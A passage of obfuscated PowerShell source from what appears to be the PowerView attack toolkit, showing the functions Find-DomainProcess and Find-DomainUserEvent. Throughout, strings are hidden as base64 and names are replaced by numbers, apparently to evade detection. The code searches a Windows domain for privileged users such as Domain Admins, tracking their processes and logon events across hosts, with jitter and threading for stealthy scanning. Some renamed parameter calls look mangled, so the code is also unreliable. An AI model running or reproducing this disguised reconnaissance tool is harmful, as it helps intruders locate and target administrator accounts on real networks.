        $UserLDAPFilter,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${96} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${f5} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${f4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${f3} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${110} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${88} = ${94}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${88} = f79 @96 | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $(${88}.Length)"
        if (${88}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA==')))]) {
            ${111} = @()
            ForEach (${114} in $ProcessName) {
                ${111} += ${114}.Split(',')
            }
            if (${111} -isnot [System.Array]) {
                ${111} = [String[]] @(${111})
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            ${103} = f71 @110 | select -ExpandProperty samaccountname
        }
        else {
            ${109} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${109}
            ${103} = f85 @109 | select -ExpandProperty MemberName
        }
        ${87} = {
            Param(${94}, $ProcessName, ${103}, $Credential)
            ForEach (${89} in ${94}) {
                ${93} = Test-Connection -Count 1 -Quiet -ComputerName ${89}
                if (${93}) {
                    if ($Credential) {
                        ${113} = f86 -Credential $Credential -94 ${89} -ErrorAction SilentlyContinue
                    }
                    else {
                        ${113} = f86 -94 ${89} -ErrorAction SilentlyContinue
                    }
                    ForEach (${112} in ${113}) {
                        if ($ProcessName) {
                            if ($ProcessName -Contains ${112}.ProcessName) {
                                ${112}
                            }
                        }
                        elseif (${103} -Contains ${112}.User) {
                            ${112}
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainProcess] Total number of hosts: $(${88}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${90} = 0
            ${91} = New-Object System.Random
            ForEach (${89} in ${88}) {
                ${90} = ${90} + 1
                sleep -Seconds ${91}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainProcess] Enumerating server ${89} (${90} of $(${88}.count))"
                ${58} = icm -ScriptBlock ${87} -ArgumentList ${89}, ${111}, ${103}, $Credential
                ${58}
                if (${58} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVABhAHIAZwBlAHQAIAB1AHMAZQByACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGUAYQByAGwAeQA=')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${86} = @{
                'ProcessName' = ${111}
                'TargetUsers' = ${103}
                'Credential' = $Credential
            }
            f76 -94 ${88} -f12 ${87} -f11 ${86} -Threads $Threads
        }
    }
}
function Find-DomainUserEvent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94},
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${f9} = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${f8} = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${110} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) {
            ${103} = f71 @110 | select -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5AA==')))] -or (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIA')))])) {
            ${109} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5ADoAIAAkAFUAcwBlAHIARwByAG8AdQBwAEkAZABlAG4AdABpAHQAeQA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${103} = f85 @109 | select -ExpandProperty MemberName
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${88} = ${94}
        }
        else {
            ${108} = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${108}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${108}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${108}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMAIABpAG4AIABkAG8AbQBhAGkAbgA6ACAAJABEAG8AbQBhAGkAbgA=')))
            ${88} = f84 @108 | select -ExpandProperty dnshostname
        }
        if (${88} -and (${88} -isnot [System.Array])) {
            ${88} = @(,${88})
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $(${88}.Length)"
